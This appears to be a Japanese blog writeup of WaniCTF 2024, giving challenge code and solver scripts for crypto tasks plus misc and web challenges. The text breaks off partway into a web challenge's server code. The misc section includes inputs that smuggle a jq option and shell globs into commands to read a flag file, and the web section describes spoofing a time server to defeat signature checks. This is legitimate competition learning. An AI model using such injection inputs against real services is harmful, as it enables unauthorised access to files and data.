---
title: "WaniCTF 2024 Writeup"
emoji: "👻"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: ["CTF"]
published: true
---


## はじめに

![](/images/wani2024-writeup/image.png)

https://score.wanictf.org/

久しぶりにチーム SUS1st で WaniCTF 2024 に参加して 8 位でした。今回は Crypto 5 問と Misc と Web の数問を解いたので、その writeup を書きます。チームで CTF に参加することが少ないのですが、チーム戦だとモチベーションが全然違いますね。

## Crypto

### beginners_rsa [Beginner]

#### 問題

```python:chall.py
from Crypto.Util.number import *

p = getPrime(64)
q = getPrime(64)
r = getPrime(64)
s = getPrime(64)
a = getPrime(64)
n = p*q*r*s*a
e = 0x10001

FLAG = b'FLAG{This_is_a_fake_flag}'
m = bytes_to_long(FLAG)
enc = pow(m, e, n)
print(f'n = {n}')
print(f'e = {e}')
print(f'enc = {enc}')
```

```python:output.txt
n = 317903423385943473062528814030345176720578295695512495346444822768171649361480819163749494400347
e = 65537
enc = 127075137729897107295787718796341877071536678034322988535029776806418266591167534816788125330265⏎
```

#### 解法

`getPrime(64)` からわかるように、$n$ を構成する素数が小さいので素因数分解ができます。たとえば、[factordb](https://factordb.com/)^[2024/06/23 の執筆時に閲覧したところ接続できませんでした。] や sage の `factor()` で素因数分解できます。今回は sage を使って素因数分解したものをコピー&ペーストしてきました。復号は素数 2 つのときと同様です。

```python:sol.py
from functools import reduce
from Crypto.Util.number import long_to_bytes

n = 317903423385943473062528814030345176720578295695512495346444822768171649361480819163749494400347
e = 65537
enc = 127075137729897107295787718796341877071536678034322988535029776806418266591167534816788125330265
# factor(n)
primes = [
    9953162929836910171,
    11771834931016130837,
    12109985960354612149,
    13079524394617385153,
    17129880600534041513,
]

phi = reduce(lambda x, y: x * y, map(lambda p: p - 1, primes))
d = pow(e, -1, phi)
m = pow(enc, d, n)
flag = long_to_bytes(m)
print(flag.decode())
```

### beginners_aes [Beginner]

#### 問題

```python:chall.py
# https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from os import urandom
import hashlib

key = b'the_enc_key_is_'
iv = b'my_great_iv_is_'
key += urandom(1)
iv += urandom(1)

cipher = AES.new(key, AES.MODE_CBC, iv)
FLAG = b'FLAG{This_is_a_dummy_flag}'
flag_hash = hashlib.sha256(FLAG).hexdigest()

msg = pad(FLAG, 16)
enc = cipher.encrypt(msg)

print(f'enc = {enc}') # bytes object
print(f'flag_hash = {flag_hash}') # str object
```

```python:output.txt
enc = b'\x16\x97,\xa7\xfb_\xf3\x15.\x87jKRaF&"\xb6\xc4x\xf4.K\xd77j\xe5MLI_y\xd96\xf1$\xc5\xa3\x03\x990Q^\xc0\x17M2\x18'
flag_hash = 6a96111d69e015a07e96dcd141d31e7fc81c4420dbbef75aef5201809093210e
```

#### 解法

`key` と `iv` の未知な部分は `urandom(1)` のそれぞれ 1 バイトなので総当たりができます。

```python:sol.py
from Crypto.Util.Padding import unpad
from Crypto.Cipher import AES
import hashlib

key = b"the_enc_key_is_"
iv = b"my_great_iv_is_"

enc = b'\x16\x97,\xa7\xfb_\xf3\x15.\x87jKRaF&"\xb6\xc4x\xf4.K\xd77j\xe5MLI_y\xd96\xf1$\xc5\xa3\x03\x990Q^\xc0\x17M2\x18'
flag_hash = "6a96111d69e015a07e96dcd141d31e7fc81c4420dbbef75aef5201809093210e"

for x in range(0x100):
    for y in range(0x100):
        key += x.to_bytes(1, byteorder="big")
        iv += y.to_bytes(1, byteorder="big")
        cipher = AES.new(key, AES.MODE_CBC, iv)
        dec = cipher.decrypt(enc)
        key = b"the_enc_key_is_"
        iv = b"my_great_iv_is_"
        try:
            msg = unpad(dec, 16)
            msg_hash = hashlib.sha256(msg).hexdigest()
            if msg_hash == flag_hash:
                print(f"key = {key}")
                print(f"iv = {iv}")
                print(f"msg = {msg}")
                exit()
        except:
            pass
```

### Easy calc [Easy]

#### 問題

```python:chall.py
import os
import random
from hashlib import md5

from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes, getPrime

FLAG = os.getenvb(b"FLAG", b"FAKE{THIS_IS_NOT_THE_FLAG!!!!!!}")


def encrypt(m: bytes, key: int) -> bytes:
    iv = os.urandom(16)
    key = long_to_bytes(key)
    key = md5(key).digest()
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    return iv + cipher.encrypt(m)


def f(s, p):
    u = 0
    for i in range(p):
        u += p - i
        u *= s
        u %= p

    return u


p = getPrime(1024)
s = random.randint(1, p - 1)

A = f(s, p)
ciphertext = encrypt(FLAG, s).hex()


print(f"{p = }")
print(f"{A = }")
print(f"{ciphertext = }")
```

```python:output.txt
p = 108159532265181242371960862176089900437183046655107822712736597793129430067645352619047923366465213553080964155205008757015024406041606723580700542617009651237415277095236385696694741342539811786180063943404300498027896890240121098409649537982185247548732754713793214557909539077228488668731016501718242238229
A = 60804426023059829529243916100868813693528686280274100232668009387292986893221484159514697867975996653561494260686110180269479231384753818873838897508257692444056934156009244570713404772622837916262561177765724587140931364577707149626116683828625211736898598854127868638686640564102372517526588283709560663960
ciphertext = '9fb749ef7467a5aff04ec5c751e7dceca4f3386987f252a2fc14a8970ff097a81fcb1a8fbe173465eecb74fb1a843383'
```

#### 解法

素数 `p` と `f` の出力 `A` から鍵 `s` を逆算する必要があります。`p` は 1024 ビットと巨大なので、`u` をまともにループで求めることはできません。つまり、なにかしらの簡単な表式で計算できることを示唆しています。まず、`f` の処理を整理します。

$$
\begin{align*}
A \equiv \sum_{i=0}^{p-1} s^{p-i} (p-i) \equiv -s \sum_{i=0}^{p-1} s^{-i} i \pmod{p}
\end{align*}
$$

$\sum$ の項は次の公式を使って変形できます^[[wolfram alpha](https://www.wolframalpha.com/input?i=sum%28i+*+p%5E%28-i%29%29&lang=ja) に訊いたら教えてくれました。]。

$$
\begin{align*}
  \sum_{i=2}^{p-1} i s^{-i} = \frac{s^{-p} (2 s^{p} - s^{p-1} - (p-1) s^2 + (p-1) s - s^2)}{(s - 1)^2}
\end{align*}
$$

整理すると、`s` は次のように書けます。

$$
s \equiv 1 - (A + 1)^{-1} \pmod{p}
$$

```python:sol.py
from Crypto.Util.number import long_to_bytes
from Crypto.Cipher import AES
from hashlib import md5

p = 108159532265181242371960862176089900437183046655107822712736597793129430067645352619047923366465213553080964155205008757015024406041606723580700542617009651237415277095236385696694741342539811786180063943404300498027896890240121098409649537982185247548732754713793214557909539077228488668731016501718242238229
A = 60804426023059829529243916100868813693528686280274100232668009387292986893221484159514697867975996653561494260686110180269479231384753818873838897508257692444056934156009244570713404772622837916262561177765724587140931364577707149626116683828625211736898598854127868638686640564102372517526588283709560663960
ciphertext = "9fb749ef7467a5aff04ec5c751e7dceca4f3386987f252a2fc14a8970ff097a81fcb1a8fbe173465eecb74fb1a843383"

s = (1 - pow(A + 1, -1, p)) % p

ct = bytes.fromhex(ciphertext)
iv = ct[:16]
ct = ct[16:]

key = long_to_bytes(s)
key = md5(key).digest()

cipher = AES.new(key, AES.MODE_CBC, iv=iv)
msg = cipher.decrypt(ct)
print(msg)
```

### speedy [Hard]

#### 問題

```python:chall.py
from cipher import MyCipher
from Crypto.Util.number import *
from Crypto.Util.Padding import *
import os

s0 = bytes_to_long(os.urandom(8))
s1 = bytes_to_long(os.urandom(8))

cipher = MyCipher(s0, s1)
secret = b'FLAG{'+b'*'*19+b'}'
pt = pad(secret, 8)
ct = cipher.encrypt(pt)
print(f'ct = {ct}')
```

```python:cipher.py
from Crypto.Util.number import *
from Crypto.Util.Padding import *

def rotl(x, y):
    x &= 0xFFFFFFFFFFFFFFFF
    return ((x << y) | (x >> (64 - y))) & 0xFFFFFFFFFFFFFFFF

class MyCipher:
    def __init__(self, s0, s1):
        self.X = s0
        self.Y = s1
        self.mod = 0xFFFFFFFFFFFFFFFF
        self.BLOCK_SIZE = 8

    def get_key_stream(self):
        s0 = self.X
        s1 = self.Y
        sum = (s0 + s1) & self.mod
        s1 ^= s0
        key = []
        for _ in range(8):
            key.append(sum & 0xFF)
            sum >>= 8

        self.X = (rotl(s0, 24) ^ s1 ^ (s1 << 16)) & self.mod
        self.Y = rotl(s1, 37) & self.mod
        return key

    def encrypt(self, pt: bytes):
        ct = b''
        for i in range(0, len(pt), self.BLOCK_SIZE):
            ct += long_to_bytes(self.X)
            key = self.get_key_stream()
            block = pt[i:i+self.BLOCK_SIZE]
            ct += bytes([block[j] ^ key[j] for j in range(len(block))])
        return ct
```

```python:out.txt
ct = b'"G:F\xfe\x8f\xb0<O\xc0\x91\xc8\xa6\x96\xc5\xf7N\xc7n\xaf8\x1c,\xcb\xebY<z\xd7\xd8\xc0-\x08\x8d\xe9\x9e\xd8\xa51\xa8\xfbp\x8f\xd4\x13\xf5m\x8f\x02\xa3\xa9\x9e\xb7\xbb\xaf\xbd\xb9\xdf&Y3\xf3\x80\xb8'
```

#### 解法

[作問者の writeup](https://qiita.com/icestdy/items/0db4cca0342297453dbe) で言及されているように、これは Xoroshiro128+ という擬似乱数アルゴリズムを元にしています。メルセンヌ・ツイスタよりも計算が軽いけど周期が比較的短い擬似乱数なので、計算速度が必要なときに使われる印象があります。

この問題自体はそんな背景を知らなくても解けます。復号に必要なパラメータは `s0` と `s1` です。`s0` は暗号文 `ct` についてくるので、未知なのは `s1` だけです。また、`s0` と `s1` を使って計算した `self.X` も暗号文に含まれるので、あとはこの連立方程式を何かしらの方法で解くだけです。今回は z3 で解いてみました。

```python:sol.py
from z3 import BitVec, Solver, RotateLeft, sat
from Crypto.Util.number import long_to_bytes, bytes_to_long


ct = b'"G:F\xfe\x8f\xb0<O\xc0\x91\xc8\xa6\x96\xc5\xf7N\xc7n\xaf8\x1c,\xcb\xebY<z\xd7\xd8\xc0-\x08\x8d\xe9\x9e\xd8\xa51\xa8\xfbp\x8f\xd4\x13\xf5m\x8f\x02\xa3\xa9\x9e\xb7\xbb\xaf\xbd\xb9\xdf&Y3\xf3\x80\xb8'
BLOCK_SIZE = 8
offset = 8

c = ct[offset : offset + BLOCK_SIZE]

s0 = BitVec("s0", 64)
s1 = BitVec("s1", 64)

s = Solver()
mod = 0xFFFFFFFFFFFFFFFF

s.add(s0 == bytes_to_long(ct[:offset]))
s.add(
    RotateLeft(s0, 24) ^ s1 ^ s0 ^ ((s1 ^ s0) << 16) & mod
    == bytes_to_long(ct[offset + BLOCK_SIZE : offset + 2 * BLOCK_SIZE])
)
if s.check() != sat:
    print("Failed")
    exit()

m = s.model()
print(m[s1])

s1 = m[s1].as_long()


def rotl(x, y):
    x &= 0xFFFFFFFFFFFFFFFF
    return ((x << y) | (x >> (64 - y))) & 0xFFFFFFFFFFFFFFFF


class MyCipher:
    def __init__(self, s0, s1):
        self.X = s0
        self.Y = s1
        self.mod = 0xFFFFFFFFFFFFFFFF
        self.BLOCK_SIZE = 8

    def get_key_stream(self):
        s0 = self.X
        s1 = self.Y
        sum = (s0 + s1) & self.mod
        s1 ^= s0
        key = []
        for _ in range(8):
            key.append(sum & 0xFF)
            sum >>= 8

        self.X = (rotl(s0, 24) ^ s1 ^ (s1 << 16)) & self.mod
        self.Y = rotl(s1, 37) & self.mod
        return key

    def encrypt(self, pt: bytes):
        ct = b""
        for i in range(0, len(pt), self.BLOCK_SIZE):
            ct += long_to_bytes(self.X)
            key = self.get_key_stream()
            block = pt[i : i + self.BLOCK_SIZE]
            ct += bytes([block[j] ^ key[j] for j in range(len(block))])
        return ct

    def decrypt(self, ct: bytes):
        pt = b""
        for i in range(0, len(ct), self.BLOCK_SIZE * 2):
            self.X = bytes_to_long(ct[i : i + self.BLOCK_SIZE])
            key = self.get_key_stream()
            block = ct[i + self.BLOCK_SIZE : i + self.BLOCK_SIZE * 2]
            pt += bytes([block[j] ^ key[j] for j in range(len(block))])
        return pt


cipher = MyCipher(s0, s1)
pt = cipher.decrypt(ct)
print(pt)
```

### uf [Very hard]

#### 問題

```python:chall.py
import os
from secrets import randbits
from Crypto.Util.number import bytes_to_long


FLAG = os.environb.get(b"FLAG", b"FAKE{THIS_IS_DUMMY_FLAG}")
m = bytes_to_long(FLAG)
assert m.bit_length() >= 512


def encrypt(m: int, n: int = 512) -> int:
    x = 0
    for i in range(n):
        x <<= 1
        x += m * randbits(1)
        if i >= n // 2:
            x ^= randbits(1)
    return x


X = [encrypt(m) for _ in range(4)]
print(X)
```

```python:output.txt
[6643852762092641655051592752286380661448697120839285262713138738793179330857521051418707355387198243788554658967735136760757552410466512939791351078152197994352930016306075464400264019640466277732596022216246131141036813931972036259910390741311141390889450882074162723823607552591155184799627590418587536982033939537563823, 4495106960532238798978878322218382764459613684889887356979907395021294655849239390809608204284927849117763119933285899077777162943233437728643056322845118660545730870443735090094400144586494098834221418487123653668703665085461676013454922344247818407399456870636622800919629442727075235809213114639237367651539678560390951, 7622226387024225267485603541284038981214490586915816777231024576546652676746968149372915915975325662783469952634025859954515971134032563991925283958708572235632178937041656690377178266198211581176947491463237398083133658483056792368618417698027992083481412961301906342594056438180675328433412539805240307255787971167535638, 1149407465454162408488208063367931363888120160126632926627929705372269921465081968665764846439238807939361247987642326885758277171318666479752274577607727935160689442316433824450832192798328252739495913920016290902086534688608562545166349970831960156036289570935410160077618096614135121287858428753273136461851339553609896]
```

#### 解法

まずは `encrypt` の処理を適当に書き下してみましょう。

$$
x_i = m q_i + r_i \quad (i = 0, 1, 2, 3)
$$

ここで、$x_i$ は出力、$m$ は平文、$q_i$ は $m$ にかかる乱数部分をまとめたもの、$r_i$ は xor の部分を足し算に置き換えてまとめたものです。$r_i$ は `if` の条件から $O(2^{256})$ です。

もし、xor の $r_i$ がなかったとすると、最大公約数 $\gcd (x_0, x_1, x_2, x_4)$ は $m$ になることが期待できます^[厳密には何かしらの係数がつくパターンもありますが、今回は問題ないです。]。邪魔な $r_i$ は比較的小さいので、近似的な最大公約数アルゴリズムがあれば解けそうです。こういうときに使えるアルゴリズムが **Approximate GCD** です。

ここでは解説しませんので、以下の記事やペーパーを参考にしてください。

https://zenn.dev/anko/articles/ctf-crypto-lattice#approximate-common-divisor-problem
https://eprint.iacr.org/2016/215.pdf

今回は次のような格子を作りました。上記の調整パラメータ $K$ は試行錯誤の結果、小さければ大体のパターンで $m$ が得られました。

$$
\begin{pmatrix}
K & x_1 & x_2 & x_3 \\
0 & -x_0 & 0 & 0 \\
0 & 0 & -x_0 & 0 \\
0 & 0 & 0 & -x_0
\end{pmatrix}
$$

```python:sol.sage
from Crypto.Util.number import long_to_bytes


xs = [
    6643852762092641655051592752286380661448697120839285262713138738793179330857521051418707355387198243788554658967735136760757552410466512939791351078152197994352930016306075464400264019640466277732596022216246131141036813931972036259910390741311141390889450882074162723823607552591155184799627590418587536982033939537563823,
    4495106960532238798978878322218382764459613684889887356979907395021294655849239390809608204284927849117763119933285899077777162943233437728643056322845118660545730870443735090094400144586494098834221418487123653668703665085461676013454922344247818407399456870636622800919629442727075235809213114639237367651539678560390951,
    7622226387024225267485603541284038981214490586915816777231024576546652676746968149372915915975325662783469952634025859954515971134032563991925283958708572235632178937041656690377178266198211581176947491463237398083133658483056792368618417698027992083481412961301906342594056438180675328433412539805240307255787971167535638,
    1149407465454162408488208063367931363888120160126632926627929705372269921465081968665764846439238807939361247987642326885758277171318666479752274577607727935160689442316433824450832192798328252739495913920016290902086534688608562545166349970831960156036289570935410160077618096614135121287858428753273136461851339553609896,
]

K = 1
B = matrix(
    ZZ,
    [
        [K, xs[1], xs[2], xs[3]],
        [0, -xs[0], 0, 0],
        [0, 0, -xs[0], 0],
        [0, 0, 0, -xs[0]],
    ],
)
B = B.LLL()
q = abs(B[0, 0] / K)
r = xs[0] % q
p = (xs[0] - r) // q
print(long_to_bytes(int(p)))
```

## Misc

### JQ Playground [Easy]

#### 問題

```python:main.py
from flask import *
import subprocess

app = Flask(__name__)


@app.route("/")
def get():
    return render_template("index.tmpl")


@app.route("/", methods=["POST"])
def post():
    filter = request.form["filter"]
    print("[i] filter :", filter)
    if len(filter) >= 9:
        return render_template("index.tmpl", error="Filter is too long")
    if ";" in filter or "|" in filter or "&" in filter:
        return render_template("index.tmpl", error="Filter contains invalid character")
    command = "jq '{}' test.json".format(filter)
    ret = subprocess.run(
        command,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        encoding="utf-8",
    )
    return render_template("index.tmpl", contents=ret.stdout, error=ret.stderr)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)
```

#### 解法

`jq` という json をコマンドライン上で便利に操作できるプログラムを用いた問題です。`jq` に対して 8 文字以下で `;` `|` `&` が含まれていない入力を与えることができます。

```
jq '{}' test.json
```

![](/images/wani2024-writeup/2.png)

どうやらワイルドカードが使えるようなので、man を見ながら試行錯誤すると次の入力でフラグが得られました。`'` で囲まれていることに気がつかず時間を浪費しました。

```
'-f /f*'
```

### sh [Normal]

#### 問題

```sh:game.sh
#!/usr/bin/env sh

set -euo pipefail

printf "Can you guess the number? > "

read i

if printf $i | grep -e [^0-9]; then
    printf "bye hacker!"
    exit 1
fi

r=$(head -c512 /dev/urandom | tr -dc 0-9)

if [[ $r == $i ]]; then
    printf "How did you know?!"
    cat flag.txt
else
    printf "Nope. It was $r."
fi
```

```docker:Dockerfile
# FROM alpine:3.19
FROM alpine@sha256:c5b1261d6d3e43071626931fc004f70149baeba2c8ec672bd4f27761f8e1ad6b

RUN apk add --no-cache socat

WORKDIR /
COPY game.sh flag.txt ./

RUN adduser -DH ctf
USER ctf

CMD socat -dd -v "tcp-listen:7580,reuseaddr,fork" exec:./game.sh
```

#### 解法

`game.sh` で乱数 `r` と入力 `i` を一致させるとフラグが出る問題です。この問題で注目するポイントは 2 つです。

1. `if` の条件で `printf $i` が呼ばれていて、その出力がすべて数字でないといけないこと。
2. `r` と `i` の一致に alpine のシェル ash の `[[ ]]` が使われていて、`i` が右辺にあること。

まずは 1 つ目の問題を解決しましょう。`printf $i` ということは `%d` などのフォーマットが使えます。ash という点に気をつけながら調べると、`%d` が数字以外をフォーマットするとエラーで空になることがわかります。たとえば、`%d]` とするとこのポイントを突破できます。

次に 2 つ目の問題を解決します。`[[ ]]` 内の右辺ではワイルドカードが使えるので、たとえば `*[0-9]` はこのポイントを突破できます。注意するべきな点は、ワイルドカード `*` は場所によっては置き換えられてしまいます。具体的には、`*` だけを入力すると `bin` になります。また、`[0-9]*` も `dev` になりうまくいきません。

上記のポイントを踏まえると、次のような入力を与えるとフラグが得られます。

```
*[0-9%d]
```

### cached hash [Easy]

#### 問題

```docker:Dockerfile
# FROM golang:1.22-alpine AS builder
FROM golang@sha256:6522f0ca555a7b14c46a2c9f50b86604a234cdc72452bf6a268cae6461d9000b AS builder

WORKDIR /usr/src/cachedhash

COPY go.mod go.sum ./
RUN go mod download && go mod verify

COPY . .
RUN go build -v -o /usr/local/bin/cachedhash ./...
RUN cachedhash -mode hash -file ./flag.txt > ./hashed_flag.txt

# FROM gcr.io/distroless/static-debian12:nonroot
FROM gcr.io/distroless/static-debian12@sha256:e9ac71e2b8e279a8372741b7a0293afda17650d926900233ec3a7b2b7c22a246

COPY --from=builder /usr/local/bin/cachedhash /usr/local/bin/
COPY --from=builder /usr/src/cachedhash/hashed_flag.txt /

ENTRYPOINT ["cachedhash", "-mode", "serve", "-file", "/hashed_flag.txt"]
```

```docker:docker-compose.yaml
services:
  cachedhash:
    image: public.ecr.aws/s8s0z7v7/r39cvpwh:latest
    build: .
    restart: unless-stopped
    ports:
      - "5089:5089"
```

#### 解法

問題文にあるように「マルチステージビルド」を使用しています。通常はこれだけでは `flag.txt` を入手できないので、追加で情報がないか探します。`docker-compose.yaml` を見ると、本番のイメージが aws で公開されていることがわかります。

```
public.ecr.aws/s8s0z7v7/r39cvpwh:latest
```

調べてみると、次のページで公開されていました。

https://gallery.ecr.aws/s8s0z7v7/r39cvpwh

そして、タグを見てみるとキャッシュがありました。

```
public.ecr.aws/s8s0z7v7/r39cvpwh:cache
```

ignore に `flag.txt` は含まれていないので、これに含まれていることが期待できます。とはいえ、自分の環境ではここからさきが大変で `docker pull` や `buildx` とかを使ってもフォーマットが対応していないと怒られました。色々と試した結果、`skopeo` でダウンロードできました。

```
$ skopeo copy docker://public.ecr.aws/s8s0z7v7/r39cvpwh:cache dir:./image
```

あとは `unar` で 2 回解凍を繰り返していたら、次のところから `flag.txt` が見つかりました。

```
583cf5a561807df13d4495669569f2292dde4d4f95e451f91e27c533efc5acda
```

## Web

### One Day One Letter [Normal]

#### 問題

:::details content-server/server.py

```python:content-server/server.py
import json
import os
from datetime import datetime
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.request import Request, urlopen
from urllib.parse import urljoin

from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

FLAG_CONTENT = os.environ.get('FLAG_CONTENT', 'abcdefghijkl')
assert len(FLAG_CONTENT) == 12
assert all(c in 'abcdefghijklmnopqrstuvwxyz' for c in FLAG_CONTENT)

def get_pubkey_of_timeserver(timeserver: str):
    req = Request(urljoin('https://' + timeserver, 'pubkey'))
    with urlopen(req) as res:
        key_text = res.read().decode('utf-8')
        return ECC.import_key(key_text)

def get_flag_hint_from_timestamp(timestamp: int):
    content = ['?'] * 12
    idx = timestamp // (60*60*24) % 12
    content[idx] = FLAG_CONTENT[idx]
    return 'FLAG{' + ''.join(content) + '}'

class HTTPRequestHandler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200, "ok")
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header("Access-Control-Allow-Headers", "X-Requested-With")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        try:
            nbytes = int(self.headers.get('content-length'))
            body = json.loads(self.rfile.read(nbytes).decode('utf-8'))

            timestamp = body['timestamp'].encode('utf-8')
            signature = bytes.fromhex(body['signature'])
            timeserver = body['timeserver']

            pubkey = get_pubkey_of_timeserver(timeserver)
            h = SHA256.new(timestamp)
            verifier = DSS.new(pubkey, 'fips-186-3')
            verifier.verify(h, signature)
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            dt = datetime.fromtimestamp(int(timestamp))
            res_body = f'''<p>Current time is {dt.date()} {dt.time()}.</p>
<p>Flag is {get_flag_hint_from_timestamp(int(timestamp))}.</p>
<p>You can get only one letter of the flag each day.</p>
<p>See you next day.</p>
'''
            self.wfile.write(res_body.encode('utf-8'))
            self.requestline
        except Exception:
            self.send_response(HTTPStatus.UNAUTHORIZED)
            self.end_headers()

handler = HTTPRequestHandler
httpd = HTTPServer(('', 5000), handler)
httpd.serve_forever()
```
:::

:::details time-server/server.py

```python:time-server/server.py
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import time
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')

class HTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/pubkey':
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            res_body = pubkey
            self.wfile.write(res_body.encode('utf-8'))
            self.requestline
        else:
            timestamp = str(int(time.time())).encode('utf-8')
            h = SHA256.new(timestamp)
            signer = DSS.new(key, 'fips-186-3')
            signature = signer.sign(h)
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-Type', 'text/json; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            res_body = json.dumps({'timestamp' : timestamp.decode('utf-8'), 'signature': signature.hex()})
            self.wfile.write(res_body.encode('utf-8'))

handler = HTTPRequestHandler
httpd = HTTPServer(('', 5001), handler)
httpd.serve_forever()
```

:::

:::details script.js

```javascript:script.js
const contentserver = 'web-one-day-one-letter-content-lz56g6.wanictf.org'
const timeserver = 'web-one-day-one-letter-time-lz56g6.wanictf.org'

function getTime() {
    return new Promise((resolve) => {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://' + timeserver);
        xhr.send();
        xhr.onload = () => {
            if(xhr.readyState == 4 && xhr.status == 200) {
                resolve(JSON.parse(xhr.response))
            }
        };
    });
}

function getContent() {
    return new Promise((resolve) => {
        getTime()
        .then((time_info) => {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://' + contentserver);
            xhr.setRequestHeader('Content-Type', 'application/json')
            const body = {
                timestamp : time_info['timestamp'],
                signature : time_info['signature'],
                timeserver : timeserver
            };
            xhr.send(JSON.stringify(body));
            xhr.onload = () => {
                if(xhr.readyState == 4 && xhr.status == 200) {
                    resolve(xhr.response);
                }
            };
        });
    });
}

function initialize() {
    getContent()
    .then((content) => {
        document.getElementById('content').innerHTML = content;
    });
}

initialize();

```

:::

:::details index.html

```html:index.html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <script type="text/javascript" src="./script.js" defer></script>
    </head>
    <body>
        <div id="content"></div>
    </body>
</html>
```

:::

#### 解法

![](/images/wani2024-writeup/3.png)

構成が「コンテンツサーバ」と「タイムサーバ」に分割されています。コンテンツサーバはタイムサーバから時間とその署名や公開鍵を受け取ります。そして、その時間に合わせて 1 日に 1 文字ずつ送信します。開催期間は 48 時間なので待つと競技が終わってしまいます。

上記の画像のページはコンテンツサーバから受け取った内容を表示したものです。


コンテンツサーバに対して、こちら側で勝手に好きなタイムサーバを指定できます。なので、運営が用意しているサーバではなく、自分で作ったサーバを使います。署名の公開鍵も指定したタイムサーバから受け取るようになっているので、署名も突破できます。

まとめると、次のステップを取ります。

1. 問題ページの `index.html` と `script.js` をダウンロードしてローカルから閲覧
2. timeserver をローカルで立てて https で何かしらの方法で公開（tunnelmole を使った）
3. `script.js` の timeserver を公開サーバに変更
4. タイムスタンプを一日ずつ変更してフラグゲット

日付の変更方法は、適当に初期値をセットしてから 1 日ずつ変更します。

```python
from datetime import datetime
custom_date = datetime(2023, 1, 1, 0, 0, 0)
timestamp = str(int(custom_date.timestamp())).encode("utf-8")
```

### Noscript [Normal]

#### 問題

```
.
├── app
│   ├── Dockerfile
│   ├── go.mod
│   ├── go.sum
│   ├── main.go
│   └── templates
│       ├── index.html
│       └── user.html
├── compose.yaml
└── crawler
    ├── Dockerfile
    ├── dumb-init_1.2.5_x86_64
    ├── index.js
    ├── package-lock.json
    └── package.json
```

:::details compose.yaml

```yaml:compose.yaml
services:
  app:
    build: ./app
    ports:
      - "8080:8080"
    environment:
      - REDIS_HOST=redis
      - REDIS_PORT=6379
  crawler:
    build: ./crawler
    environment:
      - FLAG=FAKE{***redacted***}
      - APP_URL=http://app:8080
      - HOST=app:8080
      - REDIS_HOST=redis
      - REDIS_PORT=6379
    platform: linux/amd64
  redis:
    image: "redis:alpine"
```

:::

:::details app/main.go

```go:app/main.go
package main

import (
        "context"
        "fmt"
        "html/template"
        "net/http"
        "os"
        "regexp"
        "sync"

        "github.com/gin-gonic/gin"
        "github.com/google/uuid"
        "github.com/redis/go-redis/v9"
)

type InMemoryDB struct {
        data map[string][2]string
        mu   sync.RWMutex
}

func NewInMemoryDB() *InMemoryDB {
        return &InMemoryDB{
                data: make(map[string][2]string),
        }
}

func (db *InMemoryDB) Set(key, value1, value2 string) {
        db.mu.Lock()
        defer db.mu.Unlock()
        db.data[key] = [2]string{value1, value2}
}

func (db *InMemoryDB) Get(key string) ([2]string, bool) {
        db.mu.RLock()
        defer db.mu.RUnlock()
        vals, exists := db.data[key]
        return vals, exists
}

func (db *InMemoryDB) Delete(key string) {
        db.mu.Lock()
        defer db.mu.Unlock()
        delete(db.data, key)
}

func main() {
        ctx := context.Background()

        db := NewInMemoryDB()

        redisAddr := fmt.Sprintf("%s:%s", os.Getenv("REDIS_HOST"), os.Getenv("REDIS_PORT"))
        redisClient := redis.NewClient(&redis.Options{
                Addr: redisAddr,
        })

        r := gin.Default()
        r.LoadHTMLGlob("templates/*")

        // Home page
        r.GET("/", func(c *gin.Context) {
                c.HTML(http.StatusOK, "index.html", gin.H{
                        "title": "Noscript!",
                })
        })

        // Sign in
        r.POST("/signin", func(c *gin.Context) {
                id := uuid.New().String()
                db.Set(id, "test user", "test profile")
                c.Redirect(http.StatusMovedPermanently, "/user/"+id)
        })

        // Get user profiles
        r.GET("/user/:id", func(c *gin.Context) {
                c.Header("Content-Security-Policy", "default-src 'self', script-src 'none'")
                id := c.Param("id")
                re := regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$")
                if re.MatchString(id) {
                        if val, ok := db.Get(id); ok {
                                params := map[string]interface{}{
                                        "id":       id,
                                        "username": val[0],
                                        "profile":  template.HTML(val[1]),
                                }
                                c.HTML(http.StatusOK, "user.html", params)
                        } else {
                                _, _ = c.Writer.WriteString("<p>user not found <a href='/'>Home</a></p>")
                        }
                } else {
                        _, _ = c.Writer.WriteString("<p>invalid id <a href='/'>Home</a></p>")
                }
        })

        // Modify user profiles
        r.POST("/user/:id/", func(c *gin.Context) {
                id := c.Param("id")
                re := regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$")
                if re.MatchString(id) {
                        if _, ok := db.Get(id); ok {
                                username := c.PostForm("username")
                                profile := c.PostForm("profile")
                                db.Delete(id)
                                db.Set(id, username, profile)
